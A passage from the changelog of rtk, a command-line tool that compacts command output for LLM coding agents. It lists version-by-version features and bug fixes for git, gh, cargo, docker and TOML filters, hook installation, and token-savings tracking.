* pass through -R/--repo flag in gh view commands ([#328](https://github.com/rtk-ai/rtk/issues/328)) ([0a1bcb0](https://github.com/rtk-ai/rtk/commit/0a1bcb05e5737311211369dcb92b3f756a6230c6)), closes [#223](https://github.com/rtk-ai/rtk/issues/223)
* reduce gh diff / git diff / gh api truncation ([#354](https://github.com/rtk-ai/rtk/issues/354)) ([#370](https://github.com/rtk-ai/rtk/issues/370)) ([e356c12](https://github.com/rtk-ai/rtk/commit/e356c1280da9896195d0dff91e152c5f20347a65))
* strip npx/bunx/pnpm prefixes in lint linter detection ([#186](https://github.com/rtk-ai/rtk/issues/186)) ([#366](https://github.com/rtk-ai/rtk/issues/366)) ([27b35d8](https://github.com/rtk-ai/rtk/commit/27b35d84a341622aa4bf686c2ce8867f8feeb742))

## [0.27.1](https://github.com/rtk-ai/rtk/compare/v0.27.0...v0.27.1) (2026-03-06)


### Bug Fixes

* only rewrite docker compose ps/logs/build, skip unsupported subcommands ([#336](https://github.com/rtk-ai/rtk/issues/336)) ([#363](https://github.com/rtk-ai/rtk/issues/363)) ([dbc9503](https://github.com/rtk-ai/rtk/commit/dbc950395e31b4b0bc48710dc52ad01d4d73f9ba))
* preserve -- separator for cargo commands and silence fallback ([#326](https://github.com/rtk-ai/rtk/issues/326)) ([45f9344](https://github.com/rtk-ai/rtk/commit/45f9344f033d27bc370ff54c4fc0c61e52446076)), closes [#286](https://github.com/rtk-ai/rtk/issues/286) [#287](https://github.com/rtk-ai/rtk/issues/287)
* prettier false positive when not installed ([#221](https://github.com/rtk-ai/rtk/issues/221)) ([#359](https://github.com/rtk-ai/rtk/issues/359)) ([85b0b3e](https://github.com/rtk-ai/rtk/commit/85b0b3eb0bad9cbacdc32d2e9ba525728acd7cbe))
* support git commit -am, --amend and other flags ([#327](https://github.com/rtk-ai/rtk/issues/327)) ([#360](https://github.com/rtk-ai/rtk/issues/360)) ([409aed6](https://github.com/rtk-ai/rtk/commit/409aed6dbcdd7cac2a48ec5655e6f1fd8d5248e3))

## [0.27.0](https://github.com/rtk-ai/rtk/compare/v0.26.0...v0.27.0) (2026-03-05)


### Features

* warn when installed hook is outdated ([#344](https://github.com/rtk-ai/rtk/issues/344)) ([#350](https://github.com/rtk-ai/rtk/issues/350)) ([3141fec](https://github.com/rtk-ai/rtk/commit/3141fecf958af5ae98c232543b913f3ca388254f))


### Bug Fixes

* bugs [#196](https://github.com/rtk-ai/rtk/issues/196) [#344](https://github.com/rtk-ai/rtk/issues/344) [#345](https://github.com/rtk-ai/rtk/issues/345) [#346](https://github.com/rtk-ai/rtk/issues/346) [#347](https://github.com/rtk-ai/rtk/issues/347) — gh --json, hook check, RTK_DISABLED, 2&gt;&1, json TOML ([8953af0](https://github.com/rtk-ai/rtk/commit/8953af0fc06759b37f16743ef383af0a52af2bed))
* RTK_DISABLED ignored, 2&gt;&1 broken, json TOML error ([#345](https://github.com/rtk-ai/rtk/issues/345), [#346](https://github.com/rtk-ai/rtk/issues/346), [#347](https://github.com/rtk-ai/rtk/issues/347)) ([6c13d23](https://github.com/rtk-ai/rtk/commit/6c13d234364d314f53b6698c282a621019635fd6))
* skip rewrite for gh --json/--jq/--template ([#196](https://github.com/rtk-ai/rtk/issues/196)) ([079ee9a](https://github.com/rtk-ai/rtk/commit/079ee9a4ea868ecf4e7beffcbc681ca1ba8b165c))

## [0.26.0](https://github.com/rtk-ai/rtk/compare/v0.25.0...v0.26.0) (2026-03-05)


### Features

* add Claude Code skills for PR and issue triage ([#343](https://github.com/rtk-ai/rtk/issues/343)) ([6ad6ffe](https://github.com/rtk-ai/rtk/commit/6ad6ffeccee9b622013f8e1357b6ca4c94aacb59))
* anonymous telemetry ping (1/day, opt-out) ([#334](https://github.com/rtk-ai/rtk/issues/334)) ([baff6a2](https://github.com/rtk-ai/rtk/commit/baff6a2334b155c0d68f38dba85bd8d6fe9e20af))


### Bug Fixes

* curl JSON size guard ([#297](https://github.com/rtk-ai/rtk/issues/297)) + exclude_commands config ([#243](https://github.com/rtk-ai/rtk/issues/243)) ([#342](https://github.com/rtk-ai/rtk/issues/342)) ([a8d6106](https://github.com/rtk-ai/rtk/commit/a8d6106f736e049013ecb77f0f413167266dd40e))

## [Unreleased]

### Features

* **toml-dsl:** declarative TOML filter engine — add command filters without writing Rust ([#299](https://github.com/rtk-ai/rtk/issues/299))
  * 8 primitives: `strip_ansi`, `replace`, `match_output`, `strip/keep_lines_matching`, `truncate_lines_at`, `head/tail_lines`, `max_lines`, `on_empty`
  * lookup chain: `.rtk/filters.toml` (project-local) → `~/.config/rtk/filters.toml` (user-global) → built-in filters
  * `RTK_NO_TOML=1` bypass, `RTK_TOML_DEBUG=1` debug mode
  * shadow warning when a TOML filter's match_command overlaps a Rust-handled command
  * `rtk init` generates commented filter templates at both project and global level
  * `rtk verify` command with `--require-all` for inline test validation
  * 18 built-in filters: `tofu-plan/init/validate/fmt` ([#240](https://github.com/rtk-ai/rtk/issues/240)), `du` ([#284](https://github.com/rtk-ai/rtk/issues/284)), `fail2ban-client` ([#281](https://github.com/rtk-ai/rtk/issues/281)), `iptables` ([#282](https://github.com/rtk-ai/rtk/issues/282)), `mix-format/compile` ([#310](https://github.com/rtk-ai/rtk/issues/310)), `shopify-theme` ([#280](https://github.com/rtk-ai/rtk/issues/280)), `pio-run` ([#231](https://github.com/rtk-ai/rtk/issues/231)), `mvn-build` ([#338](https://github.com/rtk-ai/rtk/issues/338)), `pre-commit`, `helm`, `gcloud`, `ansible-playbook`
* **hooks:** `exclude_commands` config — exclude specific commands from auto-rewrite ([#243](https://github.com/rtk-ai/rtk/issues/243))

### Bug Fixes

* **cargo clippy:** include actionable error details in compact output instead of summary-only counts ([#602](https://github.com/rtk-ai/rtk/issues/602))
* **curl:** skip JSON schema replacement when schema is larger than original payload ([#297](https://github.com/rtk-ai/rtk/issues/297))
* **init:** `rtk init -g --uninstall` now removes `<!-- rtk-instructions -->` block from CLAUDE.md ([#384](https://github.com/rtk-ai/rtk/issues/384))
* **toml-dsl:** fix regex overmatch on `tofu-plan/init/validate/fmt` and `mix-format/compile` — add `(\s|$)` word boundary to prevent matching subcommands (e.g. `tofu planet`, `mix formats`) ([#349](https://github.com/rtk-ai/rtk/issues/349))
* **toml-dsl:** remove 3 dead built-in filters (`docker-inspect`, `docker-compose-ps`, `pnpm-build`) — Clap routes these commands before `run_fallback`, so the TOML filters never fire ([#351](https://github.com/rtk-ai/rtk/issues/351))
* **toml-dsl:** `uv-sync` — remove `Resolved` short-circuit; it fires before the package list is printed, hiding installed packages ([#386](https://github.com/rtk-ai/rtk/issues/386))
* **toml-dsl:** `dotnet-build` — short-circuit only when both warning and error counts are zero; builds with warnings now pass through ([#386](https://github.com/rtk-ai/rtk/issues/386))
* **toml-dsl:** `poetry-install` — support Poetry 2.x bullet syntax (`•`) and `No changes.` up-to-date message ([#386](https://github.com/rtk-ai/rtk/issues/386))
* **toml-dsl:** `ping` — add Windows format support (`Pinging` header, `Reply from` per-packet lines) ([#386](https://github.com/rtk-ai/rtk/issues/386))

## [0.25.0](https://github.com/rtk-ai/rtk/compare/v0.24.0...v0.25.0) (2026-03-05)


### Features

* `rtk rewrite` — single source of truth for LLM hook rewrites ([#241](https://github.com/rtk-ai/rtk/issues/241)) ([f447a3d](https://github.com/rtk-ai/rtk/commit/f447a3d5b136dd5b1df3d5cc4969e29a68ba3f89))


### Bug Fixes

* **find:** accept native find flags (-name, -type, etc.) ([#211](https://github.com/rtk-ai/rtk/issues/211)) ([7ac5bc4](https://github.com/rtk-ai/rtk/commit/7ac5bc4bd3942841cc1abb53399025b4fcae10c9))

## [Unreleased]

### ⚠️ Migration Required

**Hook must be updated after upgrading** (`rtk init --global`).

The Claude Code hook is now a thin delegator: all rewrite logic lives in the
`rtk rewrite` command (single source of truth). The old hook embedded the full
if-else mapping inline — it still works after upgrading, but won't pick up new
commands automatically.

**Upgrade path:**
```bash
cargo install rtk          # upgrade binary
rtk init --global          # replace old hook with thin delegator
```

Running `rtk init` without `--global` updates the project-level hook only.
Users who skip this step keep the old hook working as before — no immediate
breakage, but future rule additions won't take effect until they migrate.

### Features

* **rewrite**: add `rtk rewrite` command — single source of truth for hook rewrites ([#241](https://github.com/rtk-ai/rtk/pull/241))
  - New `src/discover/registry.rs` handles all command → RTK mapping
  - Hook reduced to ~50 lines (thin delegator), no duplicate logic
  - New commands automatically available in hook without hook file changes
  - Supports compound commands (`&&`, `||`, `;`, `|`, `&`) and env prefixes
* **discover**: extract rules/patterns into `src/discover/rules.rs` — adding a command now means editing one file only
* **fix**: add `aws` and `psql` to rewrite registry (were missing despite modules existing since 0.24.0)

### Tests

* +48 regression tests covering all command categories: aws, psql, Python, Go, JS/TS,
  compound operators, sudo/env prefixes, registry invariants (607 total, was 559)
* +5 tests for uninstall `--claude-md` artifact cleanup (614 total)

## [0.24.0](https://github.com/rtk-ai/rtk/compare/v0.23.0...v0.24.0) (2026-03-04)


### Features

* add AWS CLI and psql modules with token-optimized output ([#216](https://github.com/rtk-ai/rtk/issues/216)) ([b934466](https://github.com/rtk-ai/rtk/commit/b934466364c131de2656eefabe933965f8424e18))
* passthrough fallback when Clap parse fails + review fixes ([#200](https://github.com/rtk-ai/rtk/issues/200)) ([772b501](https://github.com/rtk-ai/rtk/commit/772b5012ede833c3f156816f212d469560449a30))
* **security:** add SHA-256 hook integrity verification ([f2caca3](https://github.com/rtk-ai/rtk/commit/f2caca3abc330fb45a466af6a837ed79c3b00b40))


### Bug Fixes

* **git:** propagate exit codes in push/pull/fetch/stash/worktree ([#234](https://github.com/rtk-ai/rtk/issues/234)) ([5cfaecc](https://github.com/rtk-ai/rtk/commit/5cfaeccaba2fc6e1fe5284f57b7af7ec7c0a224d))
* **playwright:** fix JSON parser to match real Playwright output format ([#193](https://github.com/rtk-ai/rtk/issues/193)) ([4eb6cf4](https://github.com/rtk-ai/rtk/commit/4eb6cf4b1a2333cb710970e40a96f1004d4ab0fa))
* support additional git global options (--no-pager, --no-optional-locks, --bare, --literal-pathspecs) ([68ca712](https://github.com/rtk-ai/rtk/commit/68ca7126d45609a41dbff95e2770d58a11ebc0a3))
* support git global options (-C, -c, --git-dir, --work-tree, --no-pager, --no-optional-locks, --bare, --literal-pathspecs) ([a6ccefe](https://github.com/rtk-ai/rtk/commit/a6ccefe8e71372b61e6e556f0d36a944d1bcbd70))
* support git global options (-C, -c, --git-dir, --work-tree) ([982084e](https://github.com/rtk-ai/rtk/commit/982084ee34c17d2fe89ff9f4839374bf0caa2d19))
* update version refs to 0.23.0, module count to 51, fmt upstream files ([eed0188](https://github.com/rtk-ai/rtk/commit/eed018814b141ada8140f350adc26d9f104cf368))

## [0.23.0](https://github.com/rtk-ai/rtk/compare/v0.22.2...v0.23.0) (2026-02-28)


### Features

* add mypy command with grouped error output ([#109](https://github.com/rtk-ai/rtk/issues/109)) ([e8ef341](https://github.com/rtk-ai/rtk/commit/e8ef3418537247043808dc3c88bfd189b717a0a1))
* **gain:** add per-project token savings with -p flag ([#128](https://github.com/rtk-ai/rtk/issues/128)) ([2b550ee](https://github.com/rtk-ai/rtk/commit/2b550eebd6219a4844488d8fde1842ba3c6dec25))


### Bug Fixes

* eliminate duplicate output when grep-ing function names from git show ([#248](https://github.com/rtk-ai/rtk/issues/248)) ([a6f65f1](https://github.com/rtk-ai/rtk/commit/a6f65f11da71936d148a2562216ab45b4c4b04a0))
* filter docker compose hook rewrites to supported subcommands ([#245](https://github.com/rtk-ai/rtk/issues/245)) ([dbbf980](https://github.com/rtk-ai/rtk/commit/dbbf980f3ba9a51d0f7eb703e7b3c52fde2b784f)), closes [#244](https://github.com/rtk-ai/rtk/issues/244)
* **registry:** "fi" in IGNORED_PREFIXES shadows find commands ([#246](https://github.com/rtk-ai/rtk/issues/246)) ([48965c8](https://github.com/rtk-ai/rtk/commit/48965c85d2dd274bbdcf27b11850ccd38909e6f4))
* remove personal preferences from project CLAUDE.md ([3a8044e](https://github.com/rtk-ai/rtk/commit/3a8044ef6991b2208d904b7401975fcfcb165cdb))
* remove personal preferences from project CLAUDE.md ([d362ad0](https://github.com/rtk-ai/rtk/commit/d362ad0e4968cfc6aa93f9ef163512a692ca5d1b))
* remove remaining personal project reference from CLAUDE.md ([5b59700](https://github.com/rtk-ai/rtk/commit/5b597002dcd99029cb9c0da9b6d38b44021bdb3a))
* remove remaining personal project reference from CLAUDE.md ([dc09265](https://github.com/rtk-ai/rtk/commit/dc092655fb84a7c19a477e731eed87df5ad0b89f))
* surface build failures in go test summary ([#274](https://github.com/rtk-ai/rtk/issues/274)) ([b405e48](https://github.com/rtk-ai/rtk/commit/b405e48ca6c4be3ba702a5d9092fa4da4dff51dc))

## [0.22.2](https://github.com/rtk-ai/rtk/compare/v0.22.1...v0.22.2) (2026-02-20)


### Bug Fixes

* **grep:** accept -n flag for grep/rg compatibility ([7d561cc](https://github.com/rtk-ai/rtk/commit/7d561cca51e4e177d353e6514a618e5bb09eebc6))
* **playwright:** fix JSON parser and binary resolution ([#215](https://github.com/rtk-ai/rtk/issues/215)) ([461856c](https://github.com/rtk-ai/rtk/commit/461856c8fd78cce8e2d875ae878111d7cb3610cd))
* propagate rg exit code in rtk grep for CLI parity ([#227](https://github.com/rtk-ai/rtk/issues/227)) ([f1be885](https://github.com/rtk-ai/rtk/commit/f1be88565e602d3b6777f629d417e957a62daae2)), closes [#162](https://github.com/rtk-ai/rtk/issues/162)

## [0.22.1](https://github.com/rtk-ai/rtk/compare/v0.22.0...v0.22.1) (2026-02-19)


### Bug Fixes

* git branch creation silently swallowed by list mode ([#194](https://github.com/rtk-ai/rtk/issues/194)) ([88dc752](https://github.com/rtk-ai/rtk/commit/88dc752220dc79dfa09b871065b28ae6ef907231))
* **git:** support multiple -m flags in git commit ([292225f](https://github.com/rtk-ai/rtk/commit/292225f2dd09bfc5274cc8b4ed92d1a519929629))
* **git:** support multiple -m flags in git commit ([c18553a](https://github.com/rtk-ai/rtk/commit/c18553a55c1192610525a5341a183da46c59d50c))
* **grep:** translate BRE \| alternation and strip -r flag for rg ([#206](https://github.com/rtk-ai/rtk/issues/206)) ([70d1b04](https://github.com/rtk-ai/rtk/commit/70d1b04093a3dfcc99991502f1530cbb13bae872))
* propagate linter exit code in rtk lint ([#207](https://github.com/rtk-ai/rtk/issues/207)) ([8e826fc](https://github.com/rtk-ai/rtk/commit/8e826fc89fe7350df82ee2b1bae8104da609f2b2)), closes [#185](https://github.com/rtk-ai/rtk/issues/185)
* smart markdown body filter for gh issue/pr view ([#188](https://github.com/rtk-ai/rtk/issues/188)) ([#214](https://github.com/rtk-ai/rtk/issues/214)) ([4208015](https://github.com/rtk-ai/rtk/commit/4208015cce757654c150f3d71ddd004d22b4dd25))

## [0.22.0](https://github.com/rtk-ai/rtk/compare/v0.21.1...v0.22.0) (2026-02-18)


### Features

* add `rtk wc` command for compact word/line/byte counts ([#175](https://github.com/rtk-ai/rtk/issues/175)) ([393fa5b](https://github.com/rtk-ai/rtk/commit/393fa5ba2bda0eb1f8655a34084ea4c1e08070ae))

## [0.21.1](https://github.com/rtk-ai/rtk/compare/v0.21.0...v0.21.1) (2026-02-17)


### Bug Fixes

* gh run view drops --log-failed, --log, --json flags ([#159](https://github.com/rtk-ai/rtk/issues/159)) ([d196c2d](https://github.com/rtk-ai/rtk/commit/d196c2d2df9b7a807e02ace557a4eea45cfee77d))

## [0.21.0](https://github.com/rtk-ai/rtk/compare/v0.20.1...v0.21.0) (2026-02-17)


### Features

* **docker:** add docker compose support ([#110](https://github.com/rtk-ai/rtk/issues/110)) ([510c491](https://github.com/rtk-ai/rtk/commit/510c491238731b71b58923a0f20443ade6df5ae7))

## [0.20.1](https://github.com/rtk-ai/rtk/compare/v0.20.0...v0.20.1) (2026-02-17)


### Bug Fixes

* install to ~/.local/bin instead of /usr/local/bin (closes [#155](https://github.com/rtk-ai/rtk/issues/155)) ([#161](https://github.com/rtk-ai/rtk/issues/161)) ([0b34772](https://github.com/rtk-ai/rtk/commit/0b34772a679f3c6b5dd9609af2f6eec6d79e4a64))

## [0.20.0](https://github.com/rtk-ai/rtk/compare/v0.19.0...v0.20.0) (2026-02-16)


### Features

* add hook audit mode for verifiable rewrite metrics ([#151](https://github.com/rtk-ai/rtk/issues/151)) ([70c3786](https://github.com/rtk-ai/rtk/commit/70c37867e7282ee0ccf200022ecef8c6e4ab52f4))

## [0.19.0](https://github.com/rtk-ai/rtk/compare/v0.18.1...v0.19.0) (2026-02-16)


### Features

* tee raw output to file for LLM re-read without re-run ([#134](https://github.com/rtk-ai/rtk/issues/134)) ([a08a62b](https://github.com/rtk-ai/rtk/commit/a08a62b4e3b3c6a2ad933978b1143dcfc45cf891))

## [0.18.1](https://github.com/rtk-ai/rtk/compare/v0.18.0...v0.18.1) (2026-02-15)


### Bug Fixes

* update ARCHITECTURE.md version to 0.18.0 ([398cb08](https://github.com/rtk-ai/rtk/commit/398cb08125410a4de11162720cf3499d3c76f12d))
* update version references to 0.16.0 in README.md and CLAUDE.md ([ec54833](https://github.com/rtk-ai/rtk/commit/ec54833621c8ca666735e1a08ed5583624b250c1))
* update version references to 0.18.0 in docs ([c73ed47](https://github.com/rtk-ai/rtk/commit/c73ed470a79ab9e4771d2ad65394859e672b4123))

## [0.18.0](https://github.com/rtk-ai/rtk/compare/v0.17.0...v0.18.0) (2026-02-15)


### Features

* **gain:** colored dashboard with efficiency meter and impact bars ([#129](https://github.com/rtk-ai/rtk/issues/129)) ([606b86e](https://github.com/rtk-ai/rtk/commit/606b86ed43902dc894e6f1711f6fe7debedc2530))

## [0.17.0](https://github.com/rtk-ai/rtk/compare/v0.16.0...v0.17.0) (2026-02-15)


### Features

* **cargo:** add cargo nextest support with failures-only output ([#107](https://github.com/rtk-ai/rtk/issues/107)) ([68fd570](https://github.com/rtk-ai/rtk/commit/68fd570f2b7d5aaae7b37b07eb24eae21542595e))
* **hook:** handle global options before subcommands ([#99](https://github.com/rtk-ai/rtk/issues/99)) ([7401f10](https://github.com/rtk-ai/rtk/commit/7401f1099f3ef14598f11947262756e3f19fce8f))

## [0.16.0](https://github.com/rtk-ai/rtk/compare/v0.15.4...v0.16.0) (2026-02-14)


### Features

* **python:** add lint dispatcher + universal format command ([#100](https://github.com/rtk-ai/rtk/issues/100)) ([4cae6b6](https://github.com/rtk-ai/rtk/commit/4cae6b6c9a4fbc91c56a99f640d217478b92e6d9))

## [0.15.4](https://github.com/rtk-ai/rtk/compare/v0.15.3...v0.15.4) (2026-02-14)


### Bug Fixes

* **git:** fix for issue [#82](https://github.com/rtk-ai/rtk/issues/82) ([04e6bb0](https://github.com/rtk-ai/rtk/commit/04e6bb032ccd67b51fb69e326e27eff66c934043))
* **git:** Returns "Not a git repository" when git status is executed in a non-repo folder [#82](https://github.com/rtk-ai/rtk/issues/82) ([d4cb2c0](https://github.com/rtk-ai/rtk/commit/d4cb2c08100d04755fa776ec8000c0b9673e4370))

## [0.15.3](https://github.com/rtk-ai/rtk/compare/v0.15.2...v0.15.3) (2026-02-13)


### Bug Fixes

* prevent UTF-8 panics on multi-byte characters ([#93](https://github.com/rtk-ai/rtk/issues/93)) ([155e264](https://github.com/rtk-ai/rtk/commit/155e26423d1fe2acbaed3dc1aab8c365324d53e0))

## [0.15.2](https://github.com/rtk-ai/rtk/compare/v0.15.1...v0.15.2) (2026-02-13)


### Bug Fixes

* **hook:** use POSIX character classes for cross-platform grep compatibility ([#98](https://github.com/rtk-ai/rtk/issues/98)) ([4aafc83](https://github.com/rtk-ai/rtk/commit/4aafc832d4bdd438609358e2737a96bee4bb2467))

## [0.15.1](https://github.com/rtk-ai/rtk/compare/v0.15.0...v0.15.1) (2026-02-12)


### Bug Fixes

* improve CI reliability and hook coverage ([#95](https://github.com/rtk-ai/rtk/issues/95)) ([ac80bfa](https://github.com/rtk-ai/rtk/commit/ac80bfa88f91dfaf562cdd786ecd3048c554e4f7))
* **vitest:** robust JSON extraction for pnpm/dotenv prefixes ([#92](https://github.com/rtk-ai/rtk/issues/92)) ([e5adba8](https://github.com/rtk-ai/rtk/commit/e5adba8b214a6609cf1a2cda05f21bcf2a1adb94))

## [0.15.0](https://github.com/rtk-ai/rtk/compare/v0.14.0...v0.15.0) (2026-02-12)


### Features

* add Python and Go support ([#88](https://github.com/rtk-ai/rtk/issues/88)) ([a005bb1](https://github.com/rtk-ai/rtk/commit/a005bb15c030e16b7b87062317bddf50e12c6f32))
* **cargo:** aggregate test output into single line ([#83](https://github.com/rtk-ai/rtk/issues/83)) ([#85](https://github.com/rtk-ai/rtk/issues/85)) ([06b1049](https://github.com/rtk-ai/rtk/commit/06b10491f926f9eca4323c80d00530a1598ec649))
* make install-local.sh self-contained ([#89](https://github.com/rtk-ai/rtk/issues/89)) ([b82ad16](https://github.com/rtk-ai/rtk/commit/b82ad168533881757f45e28826cb0c4bd4cc6f97))

## [0.14.0](https://github.com/rtk-ai/rtk/compare/v0.13.1...v0.14.0) (2026-02-12)


### Features

* **ci:** automate Homebrew formula update on release ([#80](https://github.com/rtk-ai/rtk/issues/80)) ([a0d2184](https://github.com/rtk-ai/rtk/commit/a0d2184bfef4d0a05225df5a83eedba3c35865b3))


### Bug Fixes

* add website URL (rtk-ai.app) across project metadata ([#81](https://github.com/rtk-ai/rtk/issues/81)) ([c84fa3c](https://github.com/rtk-ai/rtk/commit/c84fa3c060c7acccaedb617852938c894f30f81e))
* update stale repo URLs from pszymkowiak/rtk to rtk-ai/rtk ([#78](https://github.com/rtk-ai/rtk/issues/78)) ([55d010a](https://github.com/rtk-ai/rtk/commit/55d010ad5eced14f525e659f9f35d051644a1246))

## [0.13.1](https://github.com/rtk-ai/rtk/compare/v0.13.0...v0.13.1) (2026-02-12)


### Bug Fixes

* **ci:** fix release artifacts not uploading ([#73](https://github.com/rtk-ai/rtk/issues/73)) ([bb20b1e](https://github.com/rtk-ai/rtk/commit/bb20b1e9e1619e0d824eb0e0b87109f30bf4f513))
* **ci:** fix release workflow not uploading artifacts to GitHub releases ([bd76b36](https://github.com/rtk-ai/rtk/commit/bd76b361908d10cce508aff6ac443340dcfbdd76))

## [0.13.0](https://github.com/rtk-ai/rtk/compare/v0.12.0...v0.13.0) (2026-02-12)


### Features

* **sqlite:** add custom sqlite db location ([6e181ae](https://github.com/rtk-ai/rtk/commit/6e181aec087edb50625e08b72fe7abdadbb6c72b))
* **sqlite:** add custom sqlite db location ([93364b5](https://github.com/rtk-ai/rtk/commit/93364b5457619201c656fc2423763fea77633f15))

## [0.12.0](https://github.com/rtk-ai/rtk/compare/v0.11.0...v0.12.0) (2026-02-09)


### Features

* **cargo:** add `cargo install` filtering with 80-90% token reduction ([645a773](https://github.com/rtk-ai/rtk/commit/645a773a65bb57dc2635aa405a6e2b87534491e3)), closes [#69](https://github.com/rtk-ai/rtk/issues/69)
* **cargo:** add cargo install filtering ([447002f](https://github.com/rtk-ai/rtk/commit/447002f8ba3bbd2b398f85db19b50982df817a02))

## [0.11.0](https://github.com/rtk-ai/rtk/compare/v0.10.0...v0.11.0) (2026-02-07)


### Features

* **init:** auto-patch settings.json for frictionless hook installation ([2db7197](https://github.com/rtk-ai/rtk/commit/2db7197e020857c02857c8ef836279c3fd660baf))

## [Unreleased]

### Added
- **settings.json auto-patch** for frictionless hook installation
  - Default `rtk init -g` now prompts to patch settings.json [y/N]
  - `--auto-patch`: Patch immediately without prompting (CI/CD workflows)
  - `--no-patch`: Skip patching, print manual instructions instead
  - Automatic backup: creates `settings.json.bak` before modification
  - Idempotent: detects existing hook, skips modification if present
  - `rtk init --show` now displays settings.json status
- **Uninstall command** for complete RTK removal
  - `rtk init -g --uninstall` removes hook, RTK.md, CLAUDE.md reference, and settings.json entry
  - Restores clean state for fresh installation or testing
- **Improved error handling** with detailed context messages
  - All error messages now include file paths and actionable hints
  - UTF-8 validation for hook paths
  - Disk space hints on write failures

### Changed
- Refactored `insert_hook_entry()` to use idiomatic Rust `entry()` API
- Simplified `hook_already_present()` logic with iterator chains
- Improved atomic write error messages for better debugging
## [0.10.0](https://github.com/rtk-ai/rtk/compare/v0.9.4...v0.10.0) (2026-02-07)


### Features

* Hook-first installation with 99.5% token reduction ([e7f80ad](https://github.com/rtk-ai/rtk/commit/e7f80ad29481393d16d19f55b3c2171a4b8b7915))
* **init:** refactor to hook-first with slim RTK.md ([9620f66](https://github.com/rtk-ai/rtk/commit/9620f66cd64c299426958d4d3d65bd8d1a9bc92d))

## [0.9.4](https://github.com/rtk-ai/rtk/compare/v0.9.3...v0.9.4) (2026-02-06)


### Bug Fixes

* **discover:** add cargo check support, wire RtkStatus::Passthrough, enhance rtk init ([d5f8a94](https://github.com/rtk-ai/rtk/commit/d5f8a9460421821861a32eedefc0800fb7720912))

## [0.9.3](https://github.com/rtk-ai/rtk/compare/v0.9.2...v0.9.3) (2026-02-06)


### Bug Fixes

* P0 crashes + cargo check + dedup utilities + discover status ([05078ff](https://github.com/rtk-ai/rtk/commit/05078ff2dab0c8745b9fb44b1d462c0d32ae8d77))
* P0 crashes + cargo check + dedup utilities + discover status ([60d2d25](https://github.com/rtk-ai/rtk/commit/60d2d252efbedaebae750b3122385b2377ab01eb))

## [0.9.2](https://github.com/rtk-ai/rtk/compare/v0.9.1...v0.9.2) (2026-02-05)


### Bug Fixes

* **git:** accept native git flags in add command (including -A) ([2ade8fe](https://github.com/rtk-ai/rtk/commit/2ade8fe030d8b1bc2fa294aa710ed1f5f877136f))
* **git:** accept native git flags in add command (including -A) ([40e7ead](https://github.com/rtk-ai/rtk/commit/40e7eadbaf0b89a54b63bea73014eac7cf9afb05))

## [0.9.1](https://github.com/rtk-ai/rtk/compare/v0.9.0...v0.9.1) (2026-02-04)


### Bug Fixes

* **tsc:** show every TypeScript error instead of collapsing by code ([3df8ce5](https://github.com/rtk-ai/rtk/commit/3df8ce552585d8d0a36f9c938d381ac0bc07b220))
* **tsc:** show every TypeScript error instead of collapsing by code ([67e8de8](https://github.com/rtk-ai/rtk/commit/67e8de8732363d111583e5b514d05e092355b97e))

## [0.9.0](https://github.com/rtk-ai/rtk/compare/v0.8.1...v0.9.0) (2026-02-03)


### Features

* add rtk tree + fix rtk ls + audit phase 1-2 ([278cc57](https://github.com/rtk-ai/rtk/commit/278cc5700bc39770841d157f9c53161f8d62df1e))
* audit phase 3 + tracking validation + rtk learn ([7975624](https://github.com/rtk-ai/rtk/commit/7975624d0a83c44dfeb073e17fd07dbc62dc8329))
* **git:** add fallback passthrough for unsupported subcommands ([32bbd02](https://github.com/rtk-ai/rtk/commit/32bbd025345872e46f67e8c999ecc6f71891856b))
* **grep:** add extra args passthrough (-i, -A/-B/-C, etc.) ([a240d1a](https://github.com/rtk-ai/rtk/commit/a240d1a1ee0d94c178d0c54b411eded6c7839599))
* **pnpm:** add fallback passthrough for unsupported subcommands ([614ff5c](https://github.com/rtk-ai/rtk/commit/614ff5c13f526f537231aaa9fa098763822b4ee0))
* **read:** add stdin support via "-" path ([060c38b](https://github.com/rtk-ai/rtk/commit/060c38b3c1ab29070c16c584ea29da3d5ca28f3d))
* rtk tree + fix rtk ls + full audit (phase 1-2-3) ([cb83da1](https://github.com/rtk-ai/rtk/commit/cb83da104f7beba3035225858d7f6eb2979d950c))


### Bug Fixes

* **docs:** escape HTML tags in rustdoc comments ([b13d92c](https://github.com/rtk-ai/rtk/commit/b13d92c9ea83e28e97847e0a6da696053364bbfc))
* **find:** rewrite with ignore crate + fix json stdin + benchmark pipeline ([fcc1462](https://github.com/rtk-ai/rtk/commit/fcc14624f89a7aa9742de4e7bc7b126d6d030871))
* **ls:** compact output (-72% tokens) + fix discover panic ([ea7cdb7](https://github.com/rtk-ai/rtk/commit/ea7cdb7a3b622f62e0a085144a637a22108ffdb7))

## [0.8.1](https://github.com/rtk-ai/rtk/compare/v0.8.0...v0.8.1) (2026-02-02)


### Bug Fixes

* allow git status to accept native flags ([a7ea143](https://github.com/rtk-ai/rtk/commit/a7ea1439fb99a9bd02292068625bed6237f6be0c))
* allow git status to accept native flags ([a27bce8](https://github.com/rtk-ai/rtk/commit/a27bce82f09701cb9df2ed958f682ab5ac8f954e))

## [0.8.0](https://github.com/rtk-ai/rtk/compare/v0.7.1...v0.8.0) (2026-02-02)


### Features

* add comprehensive security review workflow for PRs ([1ca6e81](https://github.com/rtk-ai/rtk/commit/1ca6e81bdf16a7eab503d52b342846c3519d89ff))
* add comprehensive security review workflow for PRs ([66101eb](https://github.com/rtk-ai/rtk/commit/66101ebb65076359a1530d8f19e11a17c268bce2))

## [0.7.1](https://github.com/pszymkowiak/rtk/compare/v0.7.0...v0.7.1) (2026-02-02)


### Features

* **execution time tracking**: Add command execution time metrics to `rtk gain` analytics
  - Total execution time and average time per command displayed in summary
  - Time column in "By Command" breakdown showing average execution duration
  - Daily breakdown (`--daily`) includes time metrics per day
  - JSON export includes `total_time_ms` and `avg_time_ms` fields
  - CSV export includes execution time columns
  - Backward compatible: historical data shows 0ms (pre-tracking)
  - Negligible overhead: <0.1ms per command
  - New SQLite column: `exec_time_ms` in commands table
* **parser infrastructure**: Three-tier fallback system for robust output parsing
  - Tier 1: Full JSON parsing with complete structured data
  - Tier 2: Degraded parsing with regex fallback and warnings
  - Tier 3: Passthrough with truncated raw output and error markers
  - Guarantees RTK never returns false data silently
* **migrate commands to OutputParser**: vitest, playwright, pnpm now use robust parsing
  - JSON parsing with safe fallbacks for all modern JS tooling
  - Improved error handling and debugging visibility
* **local LLM analysis**: Add economics analysis and comprehensive test scripts
  - `scripts/rtk-economics.sh` for token savings ROI analysis
  - `scripts/test-all.sh` with 69 assertions covering all commands
  - `scripts/test-aristote.sh` for T3 Stack project validation


### Bug Fixes

